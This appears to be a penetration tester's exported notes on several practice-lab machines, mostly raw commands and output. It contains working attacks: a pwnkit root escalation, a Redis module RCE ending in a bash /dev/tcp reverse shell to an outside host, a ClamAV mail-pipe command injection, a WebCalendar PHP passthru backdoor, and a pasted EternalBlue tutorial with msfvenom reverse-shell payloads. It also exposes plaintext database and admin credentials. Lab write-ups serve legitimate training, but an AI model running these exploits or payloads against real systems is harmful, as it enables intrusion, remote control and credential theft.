/usr/bin/true GCONV_PATH=./pwnkit.so:.<br />www-data@exghost:/tmp/pwn/CVE-2021-4034$ <br /><br />www-data@exghost:/tmp/pwn/CVE-2021-4034$ ./whiskey<br />./whiskey<br /># whoami<br />root<br /><br /><br /><img src="images/101-1.png" alt="images/101-1.png" /></div><div class='page'><h1 class='title level-2'>sybaris.pg</h1><br/>ftp upload .so file to execute rce via Redis<br /><br />redis RCE<br /><br />└─# nc 192.168.236.93 6379 -vn<br />(UNKNOWN) [192.168.236.93] 6379 (redis) open<br />MODULE LOAD /var/ftp/pub/module.so<br />+OK<br />module list<br />*1<br />*4<br />$4<br />name<br />$6<br />system<br />$3<br />ver<br />:1<br />system.exec &quot;id&quot;<br />$51<br />uid=1000(pablo) gid=1000(pablo) groups=1000(pablo)<br /><br />system.exec &quot;bash -i &gt;&amp; /dev/tcp/192.168.49.236/80 0&gt;&amp;1&quot;<br /><br />reverse shell<br /><br />Library PATH Hijack<br /><br /><h3>LD_LIBRARY_PATH</h3><br /><br /><br /></div><div class='page'><h1 class='title level-2'>clamAV.pg</h1><br/><br />mail from: &lt;&gt;<br />rcp to: &lt;nobody+&quot;|ping -c4 192.168.49.186&quot;@localhost&gt;<br />data<br /><br />.<br />quit</div><div class='page'><h1 class='title level-2'>webcal.pg</h1><br/>PORT   STATE SERVICE REASON         VERSION                                                                                                                                                                                                                  <br />21/tcp open  ftp     syn-ack ttl 63 Pure-FTPd                                                                                                                                                                                                                <br />22/tcp open  ssh     syn-ack ttl 63 OpenSSH 5.8p1 Debian 7ubuntu1 (Ubuntu Linux; protocol 2.0)                                                                                                                                                               <br />| ssh-hostkey:                                                                                                                                                                                                                                               <br />|   1024 5b:b4:3f:ad:ac:70:b3:6f:70:db:de:72:11:03:d7:1d (DSA)                                                                                                                                                                                               <br />| ssh-dss AAAAB3NzaC1kc3MAAACBAP6wWpAlaYKQ87IRMm6Iu+3P90qRxgJv2uROs7M2YY44MTnLdchXHqqe85Su4wFeGc5+P3xeEnxPvTLOH0N+gKyKUqteMQP4w1gJP4W2oEX2tzAfqY8OqAm8/R/PDx8uWFS7Ivrc5b818lMkMMNYj74TVjdB14X0+xULCg+z6cDFAAAAFQD6yo22iGSzk1uVAgUPAXWatTYWUQAAAIEAgQGQmf0qShF<br />fvh8/1C0qoiZxThFjF3WZc1HXGuajdHqbYrDHiFd2db+7jtQ03WHTNv6sxFjrpPW1R0ZT0B9MJnzbSd7CAp//KYvc/ABQa3HhIIzDR24sx1tE/Jru49IsRfWMYobP3RLCpvu67XnqrNd3xEG6B6jMN1/wiITVBOQAAACBAMnnflla3oGLXF/H+wNn11JUgmfQvT/b3ln8Wei+PrRb6LcJ1rNGNOt4+t6nREcbqhtaHChvuEM8mraoMznE2m3i<br />z8DvFpfiwUevwJ/xc1naP3W59mPaWleRXOGbCSz4+KDmTqzagrbiOuC5TDR3w0wzVK8kW8MR9mZ4kMdh6ltF                                                                                                                                                                         <br />|   2048 13:dc:ff:d4:03:51:a5:9f:0c:05:33:82:f0:4a:dd:21 (RSA)                                                                                                                                                                                               <br />| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCn7TiVoPeGyiTCtABhso46YSM8fsReiPNhyN8ItBfnPtJFUPgDlN1mxnuOv1Z2acDDxdGJ/JyhpxkrwFcQ1FtRJmj5Be/vzCdcBh/n8Ef7xgswGUSrHkHLQSocLLroxjOeVX7ClBDfpE3fNRdLPG2gDJAPbI6Xg3gFw9drZkMgoLB8RiSS8PLsuINTKDwkJsn5TwbZY3Xtk9en/U43gC6<br />el4CQU4EPAmqasudGwo+l4YopS21vxXl0zKxp4a7PPZ6SvTzCzwPh3Q90zCiRzYplBMzorvrc2+9hLVZmI3HsB2RElSspyJ5kfR/vlVH936Tq1odeTTOzuGxnwkmh7ncd                                                                                                                            <br />|   256 fe:be:7f:91:5c:5e:64:78:0b:35:e4:73:1f:01:f5:a1 (ECDSA)                                                                                                                                                                                              <br />|_ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOjqngQVBATu6P7QvVoh3hrHvJgBX+QpB9fVBk++sVvxstZXwnCkaBicePfYEDCwUZy6LyWZ8qACNmee6tCe9/A=                                                                                           <br />25/tcp open  smtp    syn-ack ttl 63 Postfix smtpd                                                                                                                                                                                                            <br />|_smtp-commands: ucal.local, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN                                                                                                                                             <br />| ssl-cert: Subject: commonName=ucal.local                                                                                                                                                                                                                   <br />| Issuer: commonName=ucal.local                                                                                                                                                                                                                              <br />| Public Key type: rsa                                                                                                                                                                                                                                       <br />| Public Key bits: 2048                                                                                                                                                                                                                                      <br />| Signature Algorithm: sha1WithRSAEncryption                                                                                                                                                                                                                 <br />| Not valid before: 2013-01-14T10:28:18                                                                                                                                                                                                                      <br />| Not valid after:  2023-01-12T10:28:18                                                                                                                                                                                                                      <br />| MD5:   868e b63c 1333 1bec fa56 0f11 99de c7b3                                                                                                                                                                                                             <br />| SHA-1: 7dab 07c5 c627 27f9 4c30 49fb da4b 2a78 d0f6 987c                                                                                                                                                                                                   <br />| -----BEGIN CERTIFICATE-----                                                                                                                                                                                                                                <br />| MIICpjCCAY4CCQDlg/bA0HIRzjANBgkqhkiG9w0BAQUFADAVMRMwEQYDVQQDEwp1                                                                                                                                                                                           <br />| Y2FsLmxvY2FsMB4XDTEzMDExNDEwMjgxOFoXDTIzMDExMjEwMjgxOFowFTETMBEG                                                                                                                                                                                           <br />| A1UEAxMKdWNhbC5sb2NhbDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB                                                                                                                                                                                           <br />| ANlQVuW8KX5J3clVb2+lb63H+Ko7580L4XLoKLD3TqN2pdL7Vc5e9YaHnD3zaztr                                                                                                                                                                                           <br />| xNWMUhYUsec5SpAtRdwue0Elm4oPT9+LMFXocn5j/P/ramdhWzaYPqYfvPzhmqNa                                                                                                                                                                                           <br />| qbS9xztZVc7zsUWAM8BmsYbO3SMmsQoBtpd2l20d5x+0bt3v6tHlWaE2wQTd4kC7                                                                                                                                                                                           <br />| bd3LAmgdXlBBFIn1RUfWZhGSmqrImyrqYl+hr+jSeWivf7XsUJ8hnQNqCKXmdmeV                                                                                                                                                                                           <br />| qNzoiaccM/E0ht5JgUL/nMuVfjnKvP2PpDGx2HzE5SbMNGzJsen36r7bsOcWaweO                                                                                                                                                                                           <br />| pOZXV49QSdvRHMyecgsKm4MCAwEAATANBgkqhkiG9w0BAQUFAAOCAQEASgiLLmO+                                                                                                                                                                                           <br />| Uv50jzyG51dFlDKQtoNOIDo4deO2molm1JU9gV5ig1FaBygwu/S0XCFSe30UgAKh                                                                                                                                                                                           <br />| 2Isr8HjSIxxMegCvVs2Neg8Wc+zjF+7VHd0Kk3RKRG6ljZPEbBcZR0nYUb9dMFvQ                                                                                                                                                                                           <br />| 2k5KgslZaOPodsvG6BEXDE4wIXk/br9UQmdYur7I7mP//rDTGiokxsaAmFHaEZkS                                                                                                                                                                                           <br />| yCO0A8qjw+7nALgYtJYUtL1tv77FgLlDsRvG+EGCf9G5iKjH+9d9Z1JbqwObUw+m<br />| yo6sffN1/IbFXEmQTWm+u+0ZlDWnFvPLnaO5o85Y5PXf3WjU42olb8whfOKKYokL<br />| buqhqjD92xrwGQ==<br />|_-----END CERTIFICATE-----<br />|_ssl-date: 2022-04-05T18:51:01+00:00; 0s from scanner time.<br />53/tcp open  domain  syn-ack ttl 63 ISC BIND 9.7.3<br />| dns-nsid: <br />|_  bind.version: 9.7.3<br />80/tcp open  http    syn-ack ttl 63 Apache httpd 2.2.20 ((Ubuntu))<br />| http-methods: <br />|_  Supported Methods: GET HEAD POST OPTIONS<br />|_http-title: Construction Page<br />|_http-server-header: Apache/2.2.20 (Ubuntu)<br /><br /><br /># nikto -h <a href="http://192.168.152.37/">http://192.168.152.37/</a>       <br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          192.168.152.37<br />+ Target Hostname:    192.168.152.37<br />+ Target Port:        80<br />+ Start Time:         2022-04-05 14:52:40 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: Apache/2.2.20 (Ubuntu)<br />+ Server may leak inodes via ETags, header found with file /, inode: 151315, size: 5105, mtime: Mon Jan 14 08:39:30 2013<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ Uncommon header &#39;tcn&#39; found, with contents: list<br />+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See <a href="http://www.wisec.it/sectou.php?id=4698ebdc59d15.">http://www.wisec.it/sectou.php?id=4698ebdc59d15.</a> The following alternatives for &#39;index&#39; were found: index.html<br />+ Apache/2.2.20 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.<br />+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS <br />+ Retrieved x-powered-by header: PHP/5.3.6-13ubuntu3.9<br />+ Cookie PHPSESSID created without the httponly flag<br />+ Cookie webcalendar_session created without the httponly flag<br />+ OSVDB-3093: /webcalendar/login.php: This might be interesting... has been seen in web logs from an unknown scanner.<br />+ RFC-1918 IP address found in the &#39;location&#39; header. The IP is &quot;10.60.60.55&quot;.<br />+ OSVDB-3268: /icons/: Directory indexing found.<br />+ OSVDB-3233: /icons/README: Apache default file found.<br />+ 8725 requests: 0 error(s) and 15 item(s) reported on remote host<br />+ End Time:           2022-04-05 15:04:28 (GMT-4) (708 seconds)<br /><br /><br />/resources            (Status: 301) [Size: 320] [--&gt; <a href="http://192.168.152.37/resources/]">http://192.168.152.37/resources/]</a><br />/index                (Status: 200) [Size: 5105]                                      <br />/send                 (Status: 200) [Size: 3168]                                      <br />/webcalendar          (Status: 301) [Size: 322] [--&gt; <a href="http://192.168.152.37/webcalendar/]">http://192.168.152.37/webcalendar/]</a><br />/server-status        (Status: 403) [Size: 295]                                         <br />Progress: 20414 / 56165 (36.35%)                                                       [ERROR] 2022/04/05 14:56:35 [!] parse &quot;<a href="http://192.168.152.37/error">http://192.168.152.37/error</a>\x1f_log&quot;: net/url: invalid control character in URL<br />/index                (Status: 200) [Size: 5105]         <br /><br /><br /><br /><br /><a href="http://192.168.152.37/webcalendar/login.php">http://192.168.152.37/webcalendar/login.php</a><br /><br /><br /><h1>WebCalendar 1.2.4 - Remote Code Execution             <br /><br />webcalendar-shell# cat settings.php<br />&lt;?php<br />/* updated via install/index.php on Tue, 05 Apr 2022 15:05:17 -0400<br />install_password: 2b793cda199e6d21d3de4c9906254ee8<br />db_type: mysql<br />db_host: localhost<br />db_database: intranet<br />db_login: wc<br />db_password: edjfbxMT7KKo2PPC<br />db_persistent: false<br />db_cachedir: /tmp<br />user_inc: user.php<br />use_http_auth: false<br />single_user: false<br />single_user_login: */print(____);passthru(base64_decode($_SERVER[HTTP_CMD]));die;<br /># end settings.php */<br />?&gt;<br /><br /><br />memodipper priv esc<br /><br /></h1><a href="https://www.exploit-db.com/exploits/18411">https://www.exploit-db.com/exploits/18411</a><h1><br />                </h1><br /></div><div class='page'><h1 class='title level-2'>internal.pg</h1><br/><a href="https://root4loot.com/post/eternalblue_manual_exploit/">https://root4loot.com/post/eternalblue_manual_exploit/</a>                          <br />      <br /><h1>MS17-010 EternalBlue Manual Exploitation</h1><br />               Published: 15 Sep, 2018           <br />                        <br /><h3>Introduction</h3><br />In this post we’ll see how EternalBlue (MS17-010) can be exploited  manually by compiling the payload from source and running it against a  vulnerable target. This is useful in situations where Metasploit is not  available or not an option, like running quick demos or exploiting from  C2 hosts. Unlike “zzz_exploit” this method does not require access to a  named pipe, nor does it require any credentials. However, the downside  to this is an increased risk of crashing the target so please use with  caution. Big thanks <a href="https://twitter.com/sleepya/">Worawit Wang</a> for developing the shellcodes and making them public.<br /><br /><h3>Obtaining the shellcodes</h3><br />Clone the following repo to obtain the kernel shellcodes<br /><code>git clone https://github.com/worawit/MS17-010.git<br /></code><br />Our point of interest are the shellcodes (<code>.asm</code>) located in MS17-010/shellcode which we must compile in order to make them executable.<br /><code>$ ls MS17-010/shellcode </code><code><span style="color:#13100b;">|</span></code><code> grep shellcode<br />eternalblue_kshellcode_x64.asm<br />eternalblue_kshellcode_x86.asm<br /></code><br />As you can see there are two <code>.asm</code>  files in this folder; one for x64 and one for x86. Which one you choose  is dependent on the architecture of your target. If you are unsure or if  you just want a payload that works on both architectures then i suggest  compiling shellcodes for both architectures and later merge them as  explained in the <a href="https://root4loot.com/post/eternalblue_manual_exploit/#optional">optional section</a> below.<br /><br /><h3>Compiling the shellcode(s)</h3><br />Run the appropriate command to assemble shellcodes with <code>nasm</code><br /><strong>x64</strong><br /><code>nasm -f bin MS17-010/shellcode/eternalblue_kshellcode_x64.asm -o ./sc_x64_kernel.bin<br /></code><br /><strong>x86</strong><br /><code>nasm -f bin MS17-010/shellcode/eternalblue_kshellcode_x86.asm -o ./sc_x86_kernel.bin<br /></code><br />Doing so will output the binary for your chosen  arch which contains everything needed to exploit the infamous  vulnerability -  which is great, however, not very useful unless it also  contains some evil code which is to be executed once the vulnerability  itself has been exploited. This “evil code” can be any binary that you  desire, provided it’s compiled for the correct architecture as well.<br />To accomplish that we must combine both the kernel exploit and the  payload into a single binary. For the sake of this example I’ll use <code>msfvenom</code> to generate a simple reverse tcp shell payload.<br /><strong>x64</strong><br /><code>$ msfvenom -p windows/x64/shell_reverse_tcp LPORT</code><code><span style="color:#81a1c1;">=</span></code><code><span style="color:#b48ead;">443</span></code><code> LHOST</code><code><span style="color:#81a1c1;">=</span></code><code>elliot.sh --platform windows -a x64 --format raw -o sc_x64_payload.bin<br />No encoder or badchars specified, outputting raw payload<br />Payload size: </code><code><span style="color:#b48ead;">510</span></code><code> bytes<br />Saved as: sc_x64_payload.bin<br /></code><br /><strong>x86</strong><br /><code>$ msfvenom -p windows/shell_reverse_tcp LPORT</code><code><span style="color:#81a1c1;">=</span></code><code><span style="color:#b48ead;">443</span></code><code> LHOST</code><code><span style="color:#81a1c1;">=</span></code><code>elliot.sh --platform windows -a x86 --format raw -o sc_x86_payload.bin<br />No encoder or badchars specified, outputting raw payload<br />Payload size: </code><code><span style="color:#b48ead;">341</span></code><code> bytes<br />Saved as: sc_x86_payload.bin<br /></code><br /><br /><h3>Concentrating binaries</h3><br />By now you should have at least one <code>*_kernel.bin</code> and one <code>*_payload_bin</code> sitting in your directory. Use <code>cat</code> to merge them as one.<br /><strong>x64</strong><br /><code>cat sc_x64_kernel.bin sc_x64_payload.bin &gt; sc_x64.bin<br /></code><br /><strong>x86</strong><br /><code>cat sc_x86_kernel.bin sc_x86_payload.bin &gt; sc_x86.bin<br /></code><br /><br /><h3>x64 and x86 in one binary (optional)</h3><br />Provided you have compiled binaries for both architectures (and want  them both in your payload) then merge them together with the included <code>eternalblue_sc_merge.py</code> script located in the <code>shellcode/</code> folder<br /><code>python MS17-010/shellcode/eternalblue_sc_merge.py sc_x86.bin sc_x64.bin sc_all.bin<br /></code><br /><br /><h3>Exploiting the target</h3><br />By now you should have one binary containing both the kernel exploit and your evil payload. To run the exploit, you must use one of the provided <code>eternalblue_exploit</code> scripts located in the <code>MS17-010/</code> folder<br /><code>$ ls MS17-010 </code><code><span style="color:#13100b;">|</span></code><code> grep eternalblue_exploit<br /><br /><br />BELOW IS THE UPDATED ONE FOR PYTHON3!!!<br /></code><a href="https://raw.githubusercontent.com/3ndG4me/AutoBlue-MS17-010/master/eternalblue_exploit7.py">https://raw.githubusercontent.com/3ndG4me/AutoBlue-MS17-010/master/eternalblue_exploit7.py</a><code><br />eternalblue_exploit7.py<br /></code><br />To decide which script to use you must first  consider the target OS. If you don’t know then you better be a working professional sitting a  test environment running these blindly target is a bad idea. If  anything, expect your target to crash or force reboot once the session  is closed.<br /><strong>eternalblue_exploit8.py</strong><br />• Windows Server 2012 (x64)<br />• Windows 8.1 &amp; RT<br />• Windows 10 (x64) (build &lt; 14393)<br /><br /><br /><br /><strong>eternalblue_exploit7.py</strong><br />◇ Windows Server 2008 &amp; R2<br />◇ Windows Server 2012 &amp; R2 (x86)<br />◇ Windows Server 2016 (x64)<br />◇ Windows Vista<br />◇ Windows 7<br /><br /><br /><strong>Running exploit</strong><br /><code>python MS17-010/eternalblue_exploit7.py &lt;target_IP&gt; final.bin<br /></code><br />Example running against vulnerable Windows 7 host:<br /><code>$ python MS17-010/eternalblue_exploit7.py 3.123.3.123 sc_all.bin<br /></code><br /><code>$ nc -lvnp </code><code><span style="color:#b48ead;">443</span></code><code><br />listening on </code><code><span style="color:#81a1c1;">[</span></code><code>any</code><code><span style="color:#81a1c1;">]</span></code><code> </code><code><span style="color:#b48ead;">443</span></code><code> ...<br />connect to </code><code><span style="color:#81a1c1;">[</span></code><code>18.197.212.241</code><code><span style="color:#81a1c1;">]</span></code><code> from </code><code><span style="color:#81a1c1;">(</span></code><code>UNKNOWN</code><code><span style="color:#81a1c1;">)</span></code><code> </code><code><span style="color:#81a1c1;">[</span></code><code>3.123.3.123</code><code><span style="color:#81a1c1;">]</span></code><code> </code><code><span style="color:#b48ead;">49191</span></code><code><br />Microsoft Windows </code><code><span style="color:#81a1c1;">[</span></code><code>Version 6.1.7601</code><code><span style="color:#81a1c1;">]</span></code><code><br />Copyright </code><code><span style="color:#81a1c1;">(</span></code><code>c</code><code><span style="color:#81a1c1;">)</span></code><code> </code><code><span style="color:#b48ead;">2009</span></code><code> Microsoft Corporation.  All rights reserved.<br /><br />C:</code><code><span style="color:#143474;">\W</span></code><code>indows</code><code><span style="color:#143474;">\s</span></code><code>ystem32&gt;whoami<br />whoami<br />nt authority</code><code><span style="color:#143474;">\s</span></code><code>ystem<br /></code><br />    <br />                                  </div><div class='page'><h1 class='title level-2'>monster.pg</h1><br/>PORT     STATE SERVICE       REASON          VERSION                                                                                                                                                                                                                                     <br />80/tcp   open  http          syn-ack ttl 127 Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.3.10)                                                                                                                                                                                     <br />| http-methods:                                                                                                                                                                                                                                                                          <br />|   Supported Methods: POST OPTIONS HEAD GET TRACE                                                                                                                                                                                                                                       <br />|_  Potentially risky methods: TRACE                                                                                                                                                                                                                                                     <br />|_http-title: Mike Wazowski                                                                                                                                                                                                                                                              <br />|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.3.10                                                                                                                                                                                                                    <br />443/tcp  open  ssl/http      syn-ack ttl 127 Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.3.10)                                                                                                                                                                                     <br />| http-methods:                                                                                                                                                                                                                                                                          <br />|   Supported Methods: POST OPTIONS HEAD GET TRACE                                                                                                                                                                                                                                       <br />|_  Potentially risky methods: TRACE                                                                                                                                                                                                                                                     <br />|_http-title: Mike Wazowski                                                                                                                                                                                                                                                              <br />| ssl-cert: Subject: commonName=localhost                                                                                                                                                                                                                                                <br />| Issuer: commonName=localhost                                                                                                                                                                                                                                                           <br />| Public Key type: rsa                                                                                                                                                                                                                                                                   <br />| Public Key bits: 1024                                                                                                                                                                                                                                                                  <br />| Signature Algorithm: sha1WithRSAEncryption                                                                                                                                                                                                                                             <br />| Not valid before: 2009-11-10T23:48:47                                                                                                                                                                                                                                                  <br />| Not valid after:  2019-11-08T23:48:47                                                                                                                                                                                                                                                  <br />| MD5:   a0a4 4cc9 9e84 b26f 9e63 9f9e d229 dee0                                                                                                                                                                                                                                         <br />| SHA-1: b023 8c54 7a90 5bfa 119c 4e8b acca eacf 3649 1ff6                                                                                                                                                                                                                               <br />| -----BEGIN CERTIFICATE-----                                                                                                                                                                                                                                                            <br />| MIIBnzCCAQgCCQC1x1LJh4G1AzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls                                                                                                                                                                                                                       <br />| b2NhbGhvc3QwHhcNMDkxMTEwMjM0ODQ3WhcNMTkxMTA4MjM0ODQ3WjAUMRIwEAYD                                                                                                                                                                                                                       <br />| VQQDEwlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMEl0yfj                                                                                                                                                                                                                       <br />| 7K0Ng2pt51+adRAj4pCdoGOVjx1BmljVnGOMW3OGkHnMw9ajibh1vB6UfHxu463o                                                                                                                                                                                                                       <br />| J1wLxgxq+Q8y/rPEehAjBCspKNSq+bMvZhD4p8HNYMRrKFfjZzv3ns1IItw46kgT                                                                                                                                                                                                                       <br />| gDpAl1cMRzVGPXFimu5TnWMOZ3ooyaQ0/xntAgMBAAEwDQYJKoZIhvcNAQEFBQAD                                                                                                                                                                                                                       <br />| gYEAavHzSWz5umhfb/MnBMa5DL2VNzS+9whmmpsDGEG+uR0kM1W2GQIdVHHJTyFd                                                                                                                                                                                                                       <br />| aHXzgVJBQcWTwhp84nvHSiQTDBSaT6cQNQpvag/TaED/SEQpm0VqDFwpfFYuufBL                                                                                                                                                                                                                       <br />| vVNbLkKxbK2XwUvu0RxoLdBMC/89HqrZ0ppiONuQ+X2MtxE=                                                                                                                                                                                                                                       <br />|_-----END CERTIFICATE-----                                                                                                                                                                                                                                                              <br />| tls-alpn:                                                                                                                                                                                                                                                                              <br />|_  http/1.1                                                                                                                                                                                                                                                                             <br />|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.3.10                                                                                                                                                                                                                    <br />|_ssl-date: TLS randomness does not represent time                                                                                                                                                                                                                                       <br />3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services                                                                                                                                                                                                                 <br />| rdp-ntlm-info:                                                                                                                                                                                                                                                                         <br />|   Target_Name: MIKE-PC                                                                                                                                                                                                                                                                 <br />|   NetBIOS_Domain_Name: MIKE-PC                                                                                                                                                                                                                                                         <br />|   NetBIOS_Computer_Name: MIKE-PC                                                                                                                                                                                                                                                       <br />|   DNS_Domain_Name: Mike-PC                                                                                                                                                                                                                                                             <br />|   DNS_Computer_Name: Mike-PC                                                                                                                                                                                                                                                           <br />|   Product_Version: 10.0.19041                                                                                                                                                                                                                                                          <br />|_  System_Time: 2022-03-22T21:12:43+00:00                                                                                                                                                                                                                                               <br />|_ssl-date: 2022-03-22T21:12:47+00:00; 0s from scanner time.                                                                                                                                                                                                                             <br />| ssl-cert: Subject: commonName=Mike-PC                                                                                                                                                                                                                                                  <br />| Issuer: commonName=Mike-PC                                                                                                                                                                                                                                                             <br />| Public Key type: rsa                                                                                                                                                                                                                                                                   <br />| Public Key bits: 2048                                                                                                                                                                                                                                                                  <br />| Signature Algorithm: sha256WithRSAEncryption                    <br /><br />ot valid before: 2022-02-21T06:47:51<br />| Not valid after:  2022-08-23T06:47:51<br />| MD5:   281f b090 3092 f666 23ba d039 e20c 8767<br />| SHA-1: 072a 7875 6db4 d5ce 3405 4e9e 2393 8bd0 65b8 340a<br />| -----BEGIN CERTIFICATE-----<br />| MIIC0jCCAbqgAwIBAgIQNUPIdFHv5ZZKespL0jly/DANBgkqhkiG9w0BAQsFADAS<br />| MRAwDgYDVQQDEwdNaWtlLVBDMB4XDTIyMDIyMTA2NDc1MVoXDTIyMDgyMzA2NDc1<br />| MVowEjEQMA4GA1UEAxMHTWlrZS1QQzCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC<br />| AQoCggEBAMj0kOMmLbpbUoDCLtS7ET/9KIc/AEtfXhArjm9QVrtP8wuAus8wXZ70<br />| JpCcGjpfw61f9oueHkevy9t60EEZ4CRMLlRwRN1t29MRmP9FcAoEf2YvOT3N1yMW<br />| qpvLuBXVOGMOeXjGv6vIaXNr8wgu4zem9EIEVL0j6NDIs/JkzMxc0UntjKq4lQii<br />| LIDYI+yv38IVd2oaQtLkChPT1yW+0c8B3SApEnfL8mUvxrSkJKR7jF4FPZhZg3D5<br />| kSDL08Fb5FQabX499mhKEd3+kaZD1PBuR+V2HRtzb9pQ2/wmfsf1rscHMADnpszg<br />| gKzQMJu1yLiqlfQh0H8wZARFRUrvMN0CAwEAAaMkMCIwEwYDVR0lBAwwCgYIKwYB<br />| BQUHAwEwCwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEBCwUAA4IBAQCUj6Wylp314Imj<br />| ytPovAgYJxtFVcuUxRbGyk8bamtsyxM41rcCDBTRyG2No4bFinjQ19Jh/OjOuUtB<br />| I/NPovY+DH98IccGN3TBBnfzby1MGqJeS2OhB5ZBdllKrydhwtsZ3vjENOSCZeLg<br />| WFGeWkT7rN6LtK4B22i93DaAbur0+tfcvvTRJ9j2SIRjR0NLgPvnY7LgcdYCuvTG<br />| TzHKBPttwRpj91T5aL/s5b3YkLRevR/jiQDnV6q9W7p3LMIn2Wf4IqFsCOLJXcZ/<br />| L/+djiq59xAEyh66b4HeOKZcfJCLNrYeVLWxNMrc3FTLLANSDaqeM5eEUez2/PoO<br />| hbrT4btE<br />|_-----END CERTIFICATE-----<br />7680/tcp open  pando-pub?    syn-ack ttl 127<br />Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br />Device type: general purpose<br />Running (JUST GUESSING): Microsoft Windows XP|2008 (87%)<br />OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2<br />OS fingerprint not ideal because: Missing a closed TCP port so results incomplete<br />Aggressive OS guesses: Microsoft Windows XP SP3 (87%), Microsoft Windows Server 2008 SP1 or Windows Server 2008 R2 (85%)<br />No exact OS matches for host (test conditions non-ideal).<br />TCP/IP fingerprint:<br />SCAN(V=7.92%E=4%D=3/22%OT=80%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=623A3BD0%P=x86_64-pc-linux-gnu)<br />SEQ(SP=107%GCD=1%ISR=105%TI=I%II=I%SS=S%TS=U)<br />OPS(O1=M54ENW8NNS%O2=M54ENW8NNS%O3=M54ENW8%O4=M54ENW8NNS%O5=M54ENW8NNS%O6=M54ENNS)<br /><br /><br /><br /><br /><br /><a href="http://192.168.130.180/blog/">http://192.168.130.180/blog/</a><br /><br />monster.pg/blog<br /><br />admin:wazowski<br /><br />download backup since all other vulns are patched!<br /><br /><br />echo &quot;a2b4e80cd640aaa6e417febe095dcbfc&quot; | ./mdxfind -h &#39;MD5&#39; -s salt.txt pass.txt -i 10                                                                                                  <br />1 salts read from salt.txt                                                                                                                                                                   <br />Iterations set to 10                                                                                                                                                                         <br />Working on hash types: MD5 MD5UC MD5SALT MD5RAW SIMD512 MD2MD5 MD2MD5PASS MD4MD5 MD4MD5PASS MD5MD5PASS GOSTMD5 GOSTMD5PASS HAV128MD5 HAV128MD5PASS HAV128_4MD5 HAV128_4MD5PASS HAV128_5MD5 HA<br />V128_5MD5PASS HAV160_3MD5 HAV160_3MD5PASS HAV160_4MD5 HAV160_4MD5PASS HAV160_5MD5 HAV160_5MD5PASS HAV192_3MD5 HAV192_3MD5PASS HAV192_4MD5 HAV192_4MD5PASS HAV192_5MD5 HAV192_5MD5PASS HAV224_<br />3MD5 HAV224_3MD5PASS HAV224_4MD5 HAV224_4MD5PASS HAV224_5MD5 HAV224_5MD5PASS HAV256MD5 HAV256MD5PASS HAV256_4MD5 HAV256_4MD5PASS HAV256_5MD5 HAV256_5MD5PASS RMD128MD5 RMD128MD5PASS RMD160MD<br />5 RMD160MD5PASS SHA1MD5 SHA1MD5PASS SHA224MD5 SHA224MD5PASS SHA256MD5 SHA256MD5PASS SHA384MD5 SHA384MD5PASS SHA512MD5 SHA512MD5PASS TIGERMD5 TIGERMD5PASS WRLMD5 WRLMD5PASS SNE128MD5 SNE128M<br />D5PASS SNE256MD5 SNE256MD5PASS MD5SHA1 MD5SHA256 MD5SHA512 MD5HEXSALT MD5SHA1MD5 MD5SHA1MD5SHA1 MD5SHA1MD5SHA1SHA1 SHA1MD5SHA1 SHA1MD5SHA1MD5 MD5HAV160_3 MD5SHA1HAV160_4 MD5SHA1MD5SHA1MD5 M<br />D5RMD160 MD5SHA1SHA256 MD5WRL MD5SHA1SHA1RAW MD5PASSMD5 MD5-DBL-PASS SHA1MD5UC SHA1MD5SHA1MD5SHA1MD5 MD5SQL5 MD5MD5UCMD5 HMAC-MD5 RMD128MD5MD5 MD5BASE64 MD5BASE64MD5 MD5SHA1BASE64 MD5SHA1MD<br />5BASE64 MD5BASE64MD5RAW MD5BASE64SHA1RAW SHA1BASE64MD5RAW MD5BASE64SHA1RAWMD5 MD5BASE64MD5RAWSHA1 MD5BASE64MD5RAWMD5 MD5BASE64MD5RAWMD5MD5 MD5BASE64SHA1RAWBASE64SHA1RAW MD5SHA1UC MD5SHA1UCM<br />D5 MD5SHA1UCMD5UC MD5SHA1u32 MD5BASE64revMD5 MD5revMD5 MD5revMD5MD5 MD5BASE64MD5MD5 MD5SQL5-40 MD5revSHA1 MD5USERIDMD5 MD5USERIDMD5MD5 MD5MD5UC MD5USERnulPASS MD5RADMIN2 MD5RADMIN2SHA1 RADM<br />IN2MD5 RADMIN2MD5MD5 RADMIN2MD5UC RADMIN2MD5SHA1 RADMIN2SHA1MD5 RADMIN2MD5MD5MD5 MD5RADMIN2MD5 MD51SALTMD5 SHA1RADMIN2MD5 MD5-MULTISALT MD52SALTMD5 MD51SALTMD5UC MD51SALTMD5MD5 MD5MD5USER S<br />HA1MD5MD5 SHA1SHA1RAWMD5 SHA1MD5MD5MD5 SHA1MD5MD5SHA1MD5 SHA1MD5MD5SHA1 SHA1MD5MD5MD5SHA1 SHA1MD5MD5MD5MD5 SHA1MD5MD5MD5MD5MD5 SHA1SHA1RAWMD5MD5 